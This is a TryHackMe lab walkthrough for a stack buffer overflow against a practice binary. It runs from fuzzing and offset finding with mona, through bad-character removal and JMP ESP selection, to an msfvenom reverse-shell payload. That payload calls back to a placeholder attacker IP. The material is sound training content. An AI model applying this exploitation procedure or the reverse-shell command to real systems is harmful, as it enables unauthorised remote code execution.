This step by step for buffer overflow is obtained from TryHackMe platform under Offensive Pentesting (Buffer Overflow Prep).

Credits to Tib3rius.


## Steps for `Buffer Overflow`

1. Set up !Mona on Debugger

```
!mona config -set workingfolder c:\mona\%p
```

2. Change the IP, what is to be sent, port on fuzzer.py. Once changed, run fuzzer.py

```
python fuzzer.py
```

Make a note of the largest number of bytes that were sent.

3. Run the following command on Kali. Input the number of bytes before the application crash, plus another 400 bytes.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number of bytes>
```

4. Copy the string that is generated from the above command and paste it under payload in the exploit.py. Run exploit.py.

```
python exploit.py
```

5. In the Debugger, use the following command. The number of bytes will be the number that is used to generate the pattern.

```
!mona findmsp -distance <number of bytes>
```

The position where EIP is will be on:

```
EIP contains normal pattern : ... (offset XXXX)
```

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

6. Generate a bytearray using the following command on debugger:

```
!mona bytearray -b "\x00"
```

This will be used to compare after the exploit is run.

7. Using the byte_generater.py, generate the characters to test the bad characters for the exploit.

```
python byte_generater.py
```

Copy the characters and paste them under `payload` in `exploit.py`.

8. Run exploit.py. The application will crash. Once the application has crashed, take note of the ESP register. Run the following on Debugger, where the address is the ESP regsiter location:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

9. Run `Step 6` again, adding in the bad characters one by one. Remove the bad characters from payload variable in `exploit.py`. Run exploit.py. The application will crash

Once the application has crashed, run `Step 8` again to compare whether there are still bad characters. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

10. With the application running, run the following command, to include the bad characters found:

```
!mona jmp -r esp -cpb "\x00\x07"
```

This is to find any `JMP ESP` that do not have the bad characters indicated.

11. Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

12. Generate a metersploit payload, using Kali IP and include bad characters, in the command below: 

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

Copy the payload and paste it under the payload in `exploit.py`.

13. Add in padding in `exploit.py`

```
padding = "\x90" * 16
```

14. Start the msfconsole listener and run the exploit. 










